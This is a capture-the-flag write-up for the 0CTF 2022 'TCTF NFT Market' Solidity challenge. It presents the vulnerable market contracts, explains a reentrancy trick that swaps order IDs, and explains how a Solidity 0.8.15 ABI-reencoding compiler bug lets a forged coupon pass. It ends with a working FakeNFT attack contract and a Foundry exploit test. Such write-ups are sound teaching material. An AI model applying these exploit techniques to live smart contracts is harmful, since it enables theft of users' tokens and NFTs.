# 0CTF 2022 TCTF NFT Market

> 原文: https://www.ctfiot.com/58223.html
> ID: 58223

// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.15;

import “@openzeppelin/contracts/token/ERC721/ERC721.sol”;

import “@openzeppelin/contracts/token/ERC20/ERC20.sol”;

import “@openzeppelin/contracts/access/Ownable.sol”;

contract TctfNFT is ERC721, Ownable {

constructor() ERC721(“TctfNFT”, “TNFT”) {

_setApprovalForAll(address(this), msg.sender, true);

}

function mint(address to, uint256 tokenId) external onlyOwner {

_mint(to, tokenId);

}

}

contract TctfToken is ERC20 {

bool airdropped;

constructor() ERC20(“TctfToken”, “TTK”) {

_mint(address(this), 100000000000);

_mint(msg.sender, 1337);

}

function airdrop() external {

require(!airdropped, “Already airdropped”);

airdropped = true;

_mint(msg.sender, 5);

}

}

struct Order {

address nftAddress;

uint256 tokenId;

uint256 price;

}

struct Coupon {

uint256 orderId;

uint256 newprice;

address issuer;

address user;

bytes reason;

}

struct Signature {

uint8 v;

bytes32[2] rs;

}

struct SignedCoupon {

Coupon coupon;

Signature signature;

}

contract TctfMarket {

event SendFlag();

event NFTListed(

address indexed seller,

address indexed nftAddress,

uint256 indexed tokenId,

uint256 price

);

event NFTCanceled(

address indexed seller,

address indexed nftAddress,

uint256 indexed tokenId

);

event NFTBought(

address indexed buyer,

address indexed nftAddress,

uint256 indexed tokenId,

uint256 price

);

bool tested;

TctfNFT public tctfNFT;

TctfToken public tctfToken;

CouponVerifierBeta public verifier;

Order[] orders;

constructor() {

tctfToken = new TctfToken();

tctfToken.approve(address(this), type(uint256).max);

tctfNFT = new TctfNFT();

tctfNFT.mint(address(tctfNFT), 1);

tctfNFT.mint(address(this), 2);

tctfNFT.mint(address(this), 3);

verifier = new CouponVerifierBeta();

orders.push(Order(address(tctfNFT), 1, 1));

orders.push(Order(address(tctfNFT), 2, 1337));

orders.push(Order(address(tctfNFT), 3, 13333333337));

}

function getOrder(uint256 orderId) public view returns (Order memory order) {

require(orderId < orders.length, “Invalid orderId”);

order = orders[orderId];

}

function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) {

require(price > 0, “Invalid price”);

require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), “Not owner”);

orders.push(Order(nftAddress, tokenId, price));

emit NFTListed(msg.sender, nftAddress, tokenId, price);

return orders.length – 1;

}

function cancelOrder(uint256 orderId) external {

Order memory order = getOrder(orderId);

require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), “Not owner”);

_deleteOrder(orderId);

emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);

}

function purchaseOrder(uint256 orderId) external {

Order memory order = getOrder(orderId);

_deleteOrder(orderId);

IERC721 nft = IERC721(order.nftAddress);

address owner = nft.ownerOf(order.tokenId);

tctfToken.transferFrom(msg.sender, owner, order.price);

nft.safeTransferFrom(owner, msg.sender, order.tokenId);

emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);

}

function purchaseWithCoupon(SignedCoupon calldata scoupon) external {

Coupon memory coupon = scoupon.coupon;

require(coupon.user == msg.sender, “Invalid user”);

require(coupon.newprice > 0, “Invalid price”);

verifier.verifyCoupon(scoupon);

Order memory order = getOrder(coupon.orderId);

_deleteOrder(coupon.orderId);

IERC721 nft = IERC721(order.nftAddress);

address owner = nft.ownerOf(order.tokenId);

tctfToken.transferFrom(coupon.user, owner, coupon.newprice);

nft.safeTransferFrom(owner, coupon.user, order.tokenId);

emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);

}

function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external {

require(!tested, “Tested”);

tested = true;

IERC721 nft = IERC721(nftAddress);

uint256 orderId = TctfMarket(this).createOrder(nftAddress, tokenId, price);

nft.approve(address(this), tokenId);

TctfMarket(this).purchaseOrder(orderId);

}

function win() external {

require(tctfNFT.ownerOf(1) == msg.sender && tctfNFT.ownerOf(2) == msg.sender && tctfNFT.ownerOf(3) == msg.sender);

emit SendFlag();

}

function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) {

IERC721 nft = IERC721(nftAddress);

address owner = nft.ownerOf(tokenId);

return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender);

}

function _deleteOrder(uint256 orderId) internal {

orders[orderId] = orders[orders.length – 1];

orders.pop();

}

function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {

return this.onERC721Received.selector;

}

}

contract CouponVerifierBeta {

TctfMarket market;

bool tested;

constructor() {

market = TctfMarket(msg.sender);

}

function verifyCoupon(SignedCoupon calldata scoupon) public {

require(!tested, “Tested”);

tested = true;

Coupon memory coupon = scoupon.coupon;

Signature memory sig = scoupon.signature;

Order memory order = market.getOrder(coupon.orderId);

bytes memory serialized = abi.encode(

“I, the issuer”, coupon.issuer,

“offer a special discount for”, coupon.user,

“to buy”, order, “at”, coupon.newprice,

“because”, coupon.reason

);

IERC721 nft = IERC721(order.nftAddress);

address owner = nft.ownerOf(order.tokenId);

require(coupon.issuer == owner, “Invalid issuer”);

require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, “Invalid signature”);

}

}

Colored by Color Scripter

cs

Problem Summary

The goal here is to emit the event SendFlag(). To do so, we need to gain control of all three NFTs.

In the contract file, there is an ERC721 called “TctfNFT” and ERC20 called “TctfToken”. We also see that during the initialization the marketplace contract gets 1337 TctfTokens. In the market’s constructor, three NFTs are minted, the first to the NFT contract and the other to the market contract. These three NFTs are put on sale on a price of 1, 1337, and some insanely large price. We’ll have to get all these NFTs.

Looking at the contract’s methods, we see that

We may get an airdrop of 5 tokens but only once.

We can create a sell order of NFT under the condition that we have control (approval or owner) over it.

We can cancel a sell order of NFT under the condition that we have control over it.

We can purchase an order of NFT with enough tokens.

We can purchase an order of NFT with a coupon, but only once. The issuer of the coupon should be the NFT owner, and we have to supply the signature of the issuer for the coupon. For this problem, we pretty much have to know the private key of the issuer.

We can use purchaseTest() function only once. Here, the market creates one order and purchases it on its own.

Approach

The constraint gives us some hints on how to approach the problem.

The first NFT is very cheap, so we can purchase without any trickery. The two functions purchaseTest() and purchaseWithCoupon() are very suspicious, and we can use these only once each. Therefore, each suspicious functions will have us stealing one NFT. Since purchaseWithCoupon() function gives us power to change a price of an order, we should use it to buy the third NFT. The second NFT costs 1337 tokens, and it just happens that the market contract holds 1337 tokens. Therefore, we should use purchaseTest function to steal those tokens.

Part 1: The purchaseTest()

There are multiple ways to solve this part of the problem. I’ll show my solution and sqrtrev’s solution.

The dangerous thing about many of the market’s methods is that it takes the order ID as input. If we simply used a mapping for these orders, it would probably not be a problem. However, we use a variable length array to handle our orders. To keep our array length the same as the number of valid orders, we use a nice algorithm which can be seen in _deleteOrder(). When an element of the array is deleted, the element at the back is put at the location of the deleted element. This is also a strategy used in OpenZeppelin’s EnumerableSet contracts to keep index of the elements. Now we see the problem – the value at a specific index may change due to element addition and deletion.

Now let’s take a look at the purchaseTest() function again. It creates order, then purchases the order.

If we look at the createOrder() function again, we see that the only external calls are done to simply check the approval or ownership, but those are done with staticcalls. Therefore, we can’t use that to attack. We also see that we can’t perform the attack in purchaseOrder(). Thankfully for us, there is an approve call to the NFT address. This can definitely be used to our advantage.

Basically, we create a dumb NFT and send it to the TctfMarket. We call purchaseTest() with the NFT.

Inside the approve() call, we will create another order, which sells a dumb NFT that we own at 1337 tokens. Then, we will remove the order that we just created. This will make the order at the order ID equal to the “sell dumb NFT at 1337 token” order. Now the market will happily purchase this new order, sending us 1337 tokens. This gives us enough funds to buy the second NFT anytime we want.

sqrtrev’s solution is much simple, it simply sends the NFT that is being sold at purchaseTest() to our EOA at the approve() call. Inside the purchaseOrder() function, we see that the funds are sent to the owner of the token, so it’ll be sent to us. Looking back, I overcomplicated this part of the problem. Part of it is because I took a look at EnumerableSet recently, I guess. It’s all very cool ideas, so it’s good.

Part 2: The purchaseWithCoupon()

The first thing we have to notice is that verifyCoupon() is practically a view function. The getOrder() function inside is  view, so it’ll be done with staticcall. The ownerOf() function is also view, so staticcall will be used. Therefore, we can’t use the same idea to re-enter with a different order at coupon’s order ID. Therefore, we can’t do anything malicious until the token transfers come in.

We initially thought that the ideas from Part 1 still work, so I wrote all scripts and then realized that it doesn’t work.

I believed that a compiler bug must be the way to go, and began searching on solidity’s list of known bugs.

Then I came across https://blog.soliditylang.org/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/

Head Overflow Bug in Calldata Tuple ABI-Reencoding

On July 5, 2022, Chance Hudson (@vimwitch) from the Ethereum Foundation discovered a bug in the Solidity code generator. The earliest affected version of the compiler is 0.5.8, which introduced ABI-reencoding of calldata arrays and structs. Solidity versio

blog.soliditylang.org

Literally everything matched the challenge –

This solidity bug was patched in 0.8.16. The challenge uses 0.8.15.

It’s stated that the last component must be static-sized array. It is bytes32[2].

It’s stated that one dynamic component is needed. There is a bytes value.

The bug clears the first 32 bytes of the first dynamic tuple. That happens to be order ID.

In the blog, it is stated that “Plausible attacks against affected contracts can only occur in situations where the contract accepts a static calldata array as a part of its input and forwards it to another external call without modifying the content.” This is exactly what happens in purchaseWithCoupon() and verifyCoupon(). The SignedCoupon struct is sent in as a calldata, and it’s directly forwarded.

Some testing shows that if we send a SignedCoupon with order ID 1, it’s forwarded to verifyCoupon with order ID 0.

This means that if we have some order that we control at order 0 and the order for the third NFT at some other place, we can use the coupon. This is because the order used to verify the coupon is the order 0, which we own the NFT of. This means that we can sign our own coupon, but use it on the order for the third NFT with the solidity bug. All that’s left is to combine these.

Part 3: Combining Everything

We’ll denote the order for the NFTs that we need to get as order #1, #2, #3. We note that for the bug at Part 2, we need a order that we control at the order ID 0. With this in mind, we will set up our attack as follows. We’ll use sqrtrev’s approach on Part 1.

Get the TctfToken airdrop. Currently, the orders on the market is [#1, #2, #3].

Perform sqrtrev’s attack. We’ll get 1337 tokens, and the orders on the market is still [#1, #2, #3].

We’ll buy NFT #2 with our 1337 tokens, and the orders on the market is [#1, #3]

We’ll mint a dumb NFT to ourself, and create an order. The orders on the market is [#1, #3, us].

Now we’ll buy NFT #1 with 1 token. The orders on the market is [us, #3].

Now the order ID 0 is an order we control – so the attack from Part 2 works. We buy NFT #3 with 1 token.

This will give us the flag. Foundry testing is very easy to do, but hardhat scripting was a bit painful. It can be done though.

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

34

35

36

37

38

39

40

41

42

43

44

45

46

47

48

49

50

51

52

53

54

55

56

57

58

59

60

61

62

63

64

65

66

67

68

69

70

71

72

73

74

75

76

77

78

79

80

81

82

83

84

85

86

87

88

89

90

91

92

93

94

95

96

97

98

99

100

101

102

103

104

105

106

107

108

109

// FakeNFT for attack

// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.15;

import “@openzeppelin/contracts/token/ERC721/ERC721.sol”;

import “@openzeppelin/contracts/token/ERC20/ERC20.sol”;

import “./Task.sol”;

contract FakeNFT is ERC721 {

uint256 called = 0;

uint256 approved = 0;

TctfMarket market;

TctfToken token;

constructor() ERC721(“FakeNFT”, “FNFT”) {

_setApprovalForAll(address(this), msg.sender, true);

}

function getParams(address t1, address t2) public {

market = TctfMarket(t1);

token = TctfToken(t2);

}

function mint(address to, uint256 tokenId) external {

_mint(to, tokenId);

}

function approve(address dest, uint256 tokenId) public override {

if(approved == 0) {

super.safeTransferFrom(msg.sender, USER, 1); // sqrtrev’s code: he hardcoded USER here

} else {

super.approve(dest, tokenId);

}

approved += 1;

}

function safeTransferFrom(address, address, uint256) public override {

}

}

// foundry testing

function setUp() public {

vm.label(user, “user”);

vm.label(deployer, “deployer”);

vm.startPrank(deployer, deployer);

market = new TctfMarket();

vm.stopPrank();

token = market.tctfToken();

NFT = market.tctfNFT();

}

function testExploit() public {

vm.startPrank(user);

fakeNFT = new FakeNFT();

emit log_address(address(fakeNFT));

Coupon memory coupon;

Signature memory signature;

SignedCoupon memory scoupon;

Order memory order;

token.airdrop(); // get 5 tokens

fakeNFT.mint(address(market), 1);

market.purchaseTest(address(fakeNFT), 1, 1337);

token.approve(address(market), 1337 + 5);

fakeNFT.mint(user, 2);

fakeNFT.approve(address(fakeNFT), 2);

market.createOrder(address(fakeNFT), 2, 1);

market.purchaseOrder(0);

market.purchaseOrder(1);

coupon.orderId = 1;

coupon.newprice = 1;

coupon.issuer = user;

coupon.user = user;

coupon.reason = “rkm0959”;

order = market.getOrder(0);

bytes memory serialized = abi.encode(

“I, the issuer”, coupon.issuer,

“offer a special discount for”, coupon.user,

“to buy”, order, “at”, coupon.newprice,

“because”, coupon.reason

);

(signature.v, signature.rs[0], signature.rs[1]) = vm.sign(pvk, keccak256(serialized)); // pvk = user’s private key

scoupon.coupon = coupon;

scoupon.signature = signature;

emit log_uint(uint256(signature.v));

emit log_bytes32(signature.rs[0]);

emit log_bytes32(signature.rs[1]);

market.purchaseWithCoupon(scoupon);

market.win();

}

Colored by Color Scripter

原文始发于GitHub：0CTF 2022 TCTF NFT Market